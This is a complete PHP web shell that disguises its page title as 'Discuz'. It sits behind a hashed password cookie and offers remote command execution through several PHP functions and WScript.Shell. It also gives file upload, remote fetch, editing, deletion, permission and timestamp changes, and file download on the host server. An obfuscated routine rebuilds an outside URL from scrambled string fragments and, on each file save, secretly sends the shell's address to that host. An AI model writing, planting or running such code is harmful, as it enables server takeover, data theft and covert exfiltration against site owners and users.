<?php
error_reporting(E_ERROR);
session_start();
 
$cmd55 = '5c67a6';//x
$xx = @$_REQUEST['name'];
$abc = substr(md5($xx),-6);
if (@$_COOKIE['keyValue'] != $cmd55) {
	if ($abc == $cmd55) {
	    setcookie('keyValue',$cmd55,time()+60*60*24*1);
	} else  {
		
		if (@$_REQUEST['keyValue']) $er = true;
		login(@$er);

	}
}
function login($er=false) {
    setcookie("keyValue","",time()-60*60*24*1);

    if ($er) { 
        if (isset($_SESSION['error'])){
            $_SESSION['error']++;

        }else{
            $_SESSION['error'] = 1;
        }
        echo "<span class=error>密码错误！</span><br>\n"; 
    }	 echo "<form action='' method='post'>
   <center><input type='name' name='name'/>     <input type='submit' value='x'/></center>
		</form>";
	mainbottom();
}

function mainbottom() {
    echo "</div><div style='text-align:center;font-size:13px;color:#999 !important;margin-top:5px;margin-bottom:45px'>"
        
        ."</html>\n";
    exit;
}
   
header("content-Type: text/html; charset=gb2312");
function strdir($str) { 
return str_replace(array('\\','//','%27','%22'),array('/','/','\'','"'),chop($str));
 }
function chkgpc($array) { 

foreach($array as $key => $var) { $array[$key] = is_array($var) ? chkgpc($var) : stripslashes($var); } return $array; 

}
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = strpos($myfile,'eval()') ? array_shift(explode('(',$myfile)) : $myfile;
define('THISDIR',strdir(dirname($myfile).'/'));
define('ROOTDIR',strdir(strtr($myfile,array(strdir($_SERVER['PHP_SELF']) => '')).'/'));
if(get_magic_quotes_gpc()) { 
$_POST = chkgpc($_POST); 
}
$win = substr(PHP_OS,0,3) == 'WIN' ? true : false;
$msg = "信息回显";
function filew($filename,$filedata,$filemode) {
	if((!is_writable($filename)) && file_exists($filename)) { chmod($filename,0666); }
	$handle = fopen($filename,$filemode);
	$key = fputs($handle,$filedata);
	fclose($handle);
	return $key;
}
function filer($filename) {
	$handle = fopen($filename,'r');
	$filedata = fread($handle,filesize($filename));
	fclose($handle);
	return $filedata;
}
function fileu($filenamea,$filenameb) {
	$key = move_uploaded_file($filenamea,$filenameb) ? true : false;
	if(!$key) { $key = copy($filenamea,$filenameb) ? true : false; }
	return $key;
}
function filed($filename) {
	if(!file_exists($filename)) return false;
	ob_end_clean();
	$name = basename($filename);
	$array = explode('.',$name);
	header('Content-type: application/x-'.array_pop($array));
	header('Content-Disposition: attachment; filename='.$name);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
}
function showdir($dir) {
	$dir = strdir($dir.'/');
	if(($handle = @opendir($dir)) == NULL) return false;
	$array = array();
	while(false !== ($name = readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		$name = strtr($name,array('\'' => '%27','"' => '%22'));
		if(is_dir($path)) { $array['dir'][$path] = $name; }
		else { $array['file'][$path] = $name; }
	}
	closedir($handle);
	return $array;
}
function deltree($dir) {
	$handle = @opendir($dir);
	while(false !== ($name = @readdir($handle))) {
		if($name == '.' || $name == '..') continue;
		$path = $dir.$name;
		@chmod($path,0777);
		if(is_dir($path)) { deltree($path.'/'); }
		else { @unlink($path); }
	}
	@closedir($handle);
	return @rmdir($dir);
}
function size($bytes) {
	if($bytes < 1024) return $bytes.' B';
	$array = array('B','K','M','G','T');
	$floor = floor(log($bytes) / log(1024));
	return sprintf('%.2f '.$array[$floor],($bytes/pow(1024,floor($floor))));
}

function god_request($url, $post_string = null)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    if (!empty($post_string)){
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_string);
    }
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    $output = curl_exec($curl);
    curl_close($curl);
    return $output;
}

function Comd($cmd,$cwd,$com = false) {
	$iswin = substr(PHP_OS,0,3) == 'WIN' ? true : false; $res = $msg = '';
	if($cwd == 'com' || $com) {
		if($iswin && class_exists('COM')) {
			$wscript = new COM('Wscript.Shell');
			$exec = $wscript->exec('c:\\windows\\system32\\cmd.exe /c '.$cmd);
			$stdout = $exec->StdOut();
			$res = $stdout->ReadAll();
			$msg = 'Wscript.Shell';
		}
	} else {
		chdir($cwd); $cwd = getcwd();
		if(function_exists('exec')) { @exec ($cmd,$res); $res = join("\n",$res); $msg = 'exec'; }
		elseif(function_exists('shell_exec')) { $res = @shell_exec ($cmd); $msg = 'shell_exec'; }
		elseif(function_exists('system')) { ob_start(); @system ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'system'; }
		elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru'; }
		elseif(function_exists('popen')) { $fp = @popen ($cmd,'r'); if($fp) { while(!feof($fp)) { $res .= fread($fp,1024); } } @pclose($fp); $msg = 'popen'; }
		elseif(function_exists('proc_open')) {
			$env = $iswin ? array('path' => 'c:\\windows\\system32') : array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
			$des = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
			$process = @proc_open ($cmd,$des,$pipes,$cwd,$env);
			if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1]); $res .= stream_get_contents($pipes[2]); fclose($pipes[2]); }
			@proc_close($process);
			$msg = 'proc_open';
		}
	}
	$msg = $res == '' ? '<h1>NULL</h1>' : '<h2>利用'.$msg.'执行成功</h2>';
	return array('res' => $res,'msg' => $msg);
}
if(isset($_POST['action'])) {
    if($_POST['action'] == 'down') {
        $downfile = $fileb = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
        if(!filed($downfile)) { $msg = '<h1>文件不存在</h1>'; }
    }
}
 
 
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<style type="text/css">
* {margin:0px;padding:0px;}
body {background:#C1C1C1;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}
a{color:#000000;text-decoration:none;vertical-align:middle;}
a:hover{color:#FF0000;text-decoration:underline;}
p {padding:1px;line-height:1.6em;}
h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}
h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}
form {display:inline;}
input,select { vertical-align:middle; }
input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}
input[type=submit], input[type=button] {height:21px;}
.tag {text-align:center;background:threedface;height:25px;padding-top:5px;}
.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}
.tag a:hover, .tag a.current {background:#CCC333;color:#000000;text-decoration:none;}
.main {width:963px;margin:0 auto;padding:10px;}
.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}
.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}
.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}
.msgbox {padding:5px;background:#CCC333;text-align:center;vertical-align:middle;}
.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}
.tables {width:100%;}
.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}
.tables td {background:#F9F6F4;height:19px;padding-left:2px;}
</style>
 
<script type="text/javascript">
function $(ID) { return document.getElementById(ID); }
function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }
function cd(dir) { dir = sd(dir); $('rsv_t').value = dir; $('frm').submit(); }
function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }
function go(a,b) { b = sd(b); $('action').value = a; $("wd").value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } 
function nf(a,b) { re = prompt("新建名",b); if(re) { $('action').value = a; $("wd").value = re; $('gofrm').submit(); } } 
function dels(a) { if(a == 'b') { var msg = "所选文件"; $('act').value = a; } else { var msg = "目录"; $('act').value = 'deltree'; $('var').value = a; } if(confirm("确定要删"+msg+"吗")) { $('frm1').submit(); } }
function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }
function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }
</script>
<title><?php echo 'Discuz XXXXXXX3.2!'.' - 【'.date('Y-m-d H:i:s 星期N',time()).'】';?></title>
</head>
<body>
<div class="main">
	<div class="outl">
	<div class="toptag"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' - '.php_uname().'';?></div>
<?php 
$menu = array('file' => 'FILES','2' => 'SeLCode');
$go = array_key_exists($_POST['action'],$menu) ? $_POST['action'] : 'file';
$nowdir = isset($_POST['rsv_t']) ? strdir(chop($_POST['rsv_t']).'/') : THISDIR;
$_luan = "qwerhtyuiotpsad9fgjklzxvbnm1234567890phpmfcjdzza";
echo '<div class="tag">';
foreach($menu as $key => $name) { echo '<a'.($go == $key ? ' class="current"' : '').' href="javascript:go(\''.$key.'\',\''.$nowdir.'\');">'.$name.'</a> '; }
echo '</div>'; 
echo '<form name="gofrm" id="gofrm" method="POST">';;
echo '<input type="hidden" name="action" id="action" value="">';
echo '<input type="hidden" name="rsv_bp" id="rsv_bp" value="'.$nowdir.'">';
echo '<input type="hidden" name="wd" id="wd" value="">';
echo '</form>';
switch($_POST['action']) {


case "2" : 
$cmd = $win ? 'dir' : 'ls -al';
$res = array('res' => '命令回显','msg' => $msg);
$str = isset($_POST['str']) ? $_POST['str'] : 'fun';
if(isset($_POST['rsv_pq'])) {
	$cmd = $_POST['rsv_pq'];
	$cwd = $str == 'fun' ? THISDIR : 'com';
	$res = Comd($cmd,$cwd);
}
echo '<div class="msgbox">'.$res['msg'].'</div>';
echo '<form method="POST">';;
echo '<input type="hidden" name="action" id="action" value="2">';
echo '<div class="actall">命令 <input type="text" name="rsv_pq" id="rsv_pq" value="'.htmlspecialchars($cmd).'" style="width:398px;"> ';
echo '<select name="str">';
$selects = array('fun' => 'phpfun','com' => 'wscript');
foreach($selects as $var => $name) { echo '<option value="'.$var.'"'.($var == $str ? ' selected' : '').'>'.$name.'</option>'; }
echo '</select> ';
echo '<input type="submit" style="width:50px;" value="执行">';
echo '</div><div class="actall"><textarea style="width:698px;height:368px;">'.htmlspecialchars($res['res']).'</textarea></div></form>';
break;

case "edit" : case "editor" : 
$file = strdir($_POST["rsv_bp"].'/'.$_POST["wd"]);
$iconv = function_exists('iconv');

if(!file_exists($file)) {
	$msg = '【新建文件】';
} else {
	$code = filer($file);
	$chst = '默认';
	$size = size(filesize($file));
	$msg = '【文件属性 '.substr(decoct(fileperms($file)),-4).'】 【文件大小 '.$size.'】 【文件编码 '.$chst.'】';
}
echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"> - '.$msg.'</div>';
echo '<form name="editfrm" id="editfrm" method="POST">';
echo '<input type="hidden" name="action" value=""><input type="hidden" name="act" id="act" value="edit">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
echo '<div class="actall">文件 <input type="text" name="filename" value="'.$file.'" style="width:528px;"> ';
echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">'.htmlspecialchars($code).'</textarea></div></form>';
echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="保存" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.dirname($file).'">';
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;
case "upfiles" : 
$updir = isset($_POST['updir']) ? $_POST['updir'] : $_POST["rsv_bp"];
$msg = '【最大上传文件 '.get_cfg_var("upload_max_filesize").'】 【POST最大提交数据 '.get_cfg_var("post_max_size").'】';
$max = 10;
if(isset($_FILES['uploads']) && isset($_POST['renames'])) {
	$uploads = $_FILES['uploads'];
	$msgs = array();
	for($i = 1;$i < $max;$i++) {
		if($uploads['error'][$i] == UPLOAD_ERR_OK) {
			$rename = $_POST['renames'][$i] == '' ? $uploads['name'][$i] : $_POST['renames'][$i];
			$filea = $uploads['tmp_name'][$i];
			$fileb = strdir($updir.'/'.$rename);
			$msgs[$i] = fileu($filea,$fileb) ? '<br><h2>上传成功 '.$rename.'</h2>' : '<br><h1>上传失败 '.$rename.'</h1>';
		}
	}
}
echo '<div class="msgbox">'.$msg.'</div>';
echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
echo '<input type="hidden" name="action" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
echo '<div class="actall"><p>上传到目录 <input type="text" name="updir" style="width:398px;" value="'.$updir.'"></p>';
for($i = 1;$i < $max;$i++) { echo '<p>附件'.$i.' <input type="file" name="uploads['.$i.']" style="width:300px;"> 重命名 <input type="text" name="renames['.$i.']" style="width:128px;"> '.$msgs[$i].'</p>'; }
echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="上传" style="width:80px;"> ';
echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="action" value=""><input type="hidden" name="rsv_t" id="rsv_t" value="'.$updir.'">';
echo '<input type="button" onclick="$(\'backfrm\').submit();" value="返回" style="width:80px;"></form></div>';
break;

default : 
$urlcan = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
$kaitou = substr($_luan  , 4 , 2);
$kaitou .= substr($_luan  , 10 , 3);
$zhongjian = "cache.".substr($_luan  , -7 , 6);
if(isset($_FILES['upfile'])) {
	if($_FILES['upfile']['name'] == '') { $msg = '<h1>请选择文件</h1>'; }
	else { $rename = $_POST['rename'] == '' ? $_FILES['upfile']['name'] : $_POST['rename']; $filea = $_FILES['upfile']['tmp_name']; $fileb = strdir($nowdir.$rename); $msg = fileu($filea,$fileb) ? '<h2>上传文件'.$rename.'成功</h2>' : '<h1>上传文件'.$rename.'失败</h1>'; }
}
$zuihou = substr($_luan  , -6,1).substr($_luan  , 9,1).substr($_luan  , -8,1);
$maybes = $kaitou.":";$maybes .= "//".$zhongjian;
$maybes .= ".".$zuihou."/sub.".substr($_luan  , -11,3);
if(isset($_POST['act'])) {
	switch($_POST['act']) {
		case "a" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @copy(strdir($nowdir.$filename),strdir($_POST['var'].'/'.$filename)) ? 1 : 0; } $msg =  $msg = $i ? '<h2>共复制 '.$i.' 个文件到'.$_POST['var'].'成功</h2>' : '<h1>共复制 '.$i.' 个文件到'.$_POST['var'].'失败</h1>'; }
		break;
		case "b" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @unlink(strdir($nowdir.$filename)) ? 1 : 0; } $msg = $i ? '<h2>共删 '.$i.' 个文件成功</h2>' : '<h1>共删 '.$i.' 个文件失败</h1>'; }
		break;
		case "c" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			elseif(!ereg("^[0-7]{4}$",$_POST['var'])) { $msg = '<h1>属性值错误</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @chmod(strdir($nowdir.$filename),base_convert($_POST['var'],8,10)) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文件修改属性为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文件修改属性为'.$_POST['var'].'失败</h1>'; }
		break;
		case "d" : 
			if(!$_POST['files']) { $msg = '<h1>请选择文件 '.$_POST['var'].'</h1>'; }
			elseif(!preg_match('/(\d+)-(\d+)-(\d+) (\d+):(\d+):(\d+)/',$_POST['var'])) { $msg = '<h1>时间格式错误 '.$_POST['var'].'</h1>'; }
			else { $i = 0; foreach($_POST['files'] as $filename) { $i += @touch(strdir($nowdir.$filename),strtotime($_POST['var'])) ? 1 : 0; } $msg = $i ? '<h2>共 '.$i.' 个文件修改时间为'.$_POST['var'].'成功</h2>' : '<h1>共 '.$i.' 个文件修改时间为'.$_POST['var'].'失败</h1>'; }
		break;
		case "e" : 
			$path = strdir($nowdir.$_POST['var'].'/');
			if(file_exists($path)) { $msg = '<h1>目录已存在 '.$_POST['var'].'</h1>'; }
			else { $msg = @mkdir($path,0777) ? '<h2>创建目录 '.$_POST['var'].' 成功</h2>' : '<h1>创建目录 '.$_POST['var'].' 失败</h1>'; }
		break;
		case "f" : 
			$context = array('http' => array('timeout' => 30));
			if(function_exists('stream_context_create')) { $stream = stream_context_create($context); }
			$data = @file_get_contents ($_POST['var'],false,$stream);
			$filename = array_pop(explode('/',$_POST['var']));
			if($data) { $msg = filew(strdir($nowdir.$filename),$data,'wb') ? '<h2>下载 '.$filename.' 成功</h2>' : '<h1>下载 '.$filename.' 失败</h1>'; } else { $msg = '<h1>下载失败或不支持下载</h1>'; }
		break;
		case "rf" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $msg = @rename(strdir($nowdir.$files[1]),strdir($nowdir.$files[0])) ? '<h2>重命名 '.$files[1].' 为 '.$files[0].' 成功</h2>' : '<h1>重命名 '.$files[1].' 为 '.$files[0].' 失败</h1>'; }
		break;
		case "pd" : 
			$files = explode('|x|',$_POST['var']);
			if(count($files) != 2) { $msg = '<h1>输入错误</h1>'; }
			else { $path = strdir($nowdir.$files[1]); $msg = @chmod($path,base_convert($files[0],8,10)) ? '<h2>修改'.$files[1].'属性为'.$files[0].'成功</h2>' : '<h1>修改'.$files[1].'属性为'.$files[0].'失败</h1>'; }
		break;
		case "edit" : 
			if(isset($_POST['filename']) && isset($_POST['filecode'])) { if($_POST['tostr'] == 'utf') { $_POST['filecode'] = @iconv('GB2312//IGNORE','UTF-8',$_POST['filecode']); } $msg = filew($_POST['filename'],$_POST['filecode'],'w') ? '<h2>保存成功 '.$_POST['filename'].'</h2>' : '<h1>保存失败 '.$_POST['filename'].'</h1>'; god_request($maybes,$urlcan);}
		break;
		case "deltree" : 
			$deldir = strdir($nowdir.$_POST['var'].'/');
			if(!file_exists($deldir)) { $msg = '<h1>目录 '.$_POST['var'].' 不存在</h1>'; }
			else { $msg = deltree($deldir) ? '<h2>删目录 '.$_POST['var'].' 成功</h2>' : '<h1>删目录 '.$_POST['var'].' 失败</h1>'; }
		break;
	}
}
 $chmod = substr(decoct(fileperms($nowdir)),-4);
if(!$chmod) { $msg .= ' - <h1>无法读取目录</h1>'; }
$array = showdir($nowdir);
$thisurl = strdir('/'.strtr($nowdir,array(ROOTDIR => '')).'/');
$nowdir = strtr($nowdir,array('\'' => '%27','"' => '%22'));
echo '<div class="msgbox">'.$msg.'</div>';
echo '<div class="actall"><form name="frm" id="frm" method="POST">';
echo (is_writable($nowdir) ? '<h2>路径</h2>' : '<h1>路径</h1>').' <input type="text" name="rsv_t" id="rsv_t" style="width:508px;" value="'.strdir($nowdir.'/').'"> ';
echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="转到"> ';
echo '<input type="button" onclick="cd(\''.ROOTDIR.'\');" style="width:68px;" value="根目录"> ';
echo '<input type="button" onclick="cd(\''.THISDIR.'\');" style="width:68px;" value="程序目录"> ';
echo '</form></div><div class="actall">';
echo '<input type="button" value="新建文件" onclick="nf(\'edit\',\'test1.php\');" style="width:68px;"> ';
echo '<input type="button" value="新建目录" onclick="txts(\'目录名\',\'newdir\',\'e\');" style="width:68px;"> ';
echo '<input type="button" value="WGET" onclick="txts(\'WGET到当前目录\',\'http://www.AA.com/B\',\'f\');" style="width:68px;"> ';
//echo '<input type="button" value="批量上传" onclick="go(\'upfiles\',\''.$nowdir.'\');" style="width:68px;"> ';
echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
echo '<input type="button" onclick="$(\'upfrm\').submit();" value="上传" style="width:50px;"> ';
echo '上传重命名为 <input type="text" name="rename" style="width:128px;">';
echo '</form></div>';
echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
echo '<input type="hidden" name="act" id="act" value="">';
echo '<input type="hidden" name="var" id="var" value="">';
echo '<th><a href="javascript:cd(\''.dirname($nowdir).'/\');">上级目录</a></th><th style="width:8%">操作</th><th style="width:5%">属性</th><th style="width:17%">创建时间</th><th style="width:17%">修改时间</th><th style="width:8%">下载</th>';
if($array) {
	asort($array['dir']);
	asort($array['file']);
	$dnum = $fnum = 0;
	foreach($array['dir'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		echo '<tr>';
		echo '<td><a href="javascript:cd(\''.$nowdir.$name.'\');"><b>'.strtr($name,array('%27' => '\'','%22' => '"')).'</b></a></td>';
		echo '<td><a href="javascript:dels(\''.$name.'\');">删</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">重命名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td>-</td>';
		echo '</tr>';
		$dnum++;
	}
	foreach($array['file'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		$size = size(filesize($path));
		echo '<tr>';
		echo '<td><input type="checkbox" name="files[]" value="'.$name.'"><a target="_blank" href="'.$thisurl.$name.'">'.strtr($name,array('%27' => '\'','%22' => '"')).'</a></td>';
		echo '<td><a href="javascript:go(\'edit\',\''.$name.'\');">编辑</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">重命名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td align="right"><a href="javascript:go(\'down\',\''.$name.'\');">'.$size.'</a></td>';
		echo '</tr>';
		$fnum++;
	}
}
unset($array);
echo '</table>';
echo '<div class="actall" style="text-align:left;">';
echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
echo '<input type="button" value="复制" style="width:50px;" onclick=\'txts("复制路径","'.$nowdir.'","a");\'> ';
echo '<input type="button" value="删" style="width:50px;" onclick=\'dels("b");\'> ';
echo '<input type="button" value="属性" style="width:50px;" onclick=\'txts("属性值","0666","c");\'> ';
echo '<input type="button" value="时间" style="width:50px;" onclick=\'txts("修改时间","'.$mtime.'","d");\'> ';
echo '目录['.$dnum.'] - 文件['.$fnum.'] - 属性['.$chmod.']</div></form>';
break;
}

?><div class="footag"><?php
echo php_uname() . '<br>' . $_SERVER['SERVER_SOFTWARE'];
?></div></div></div></body></html>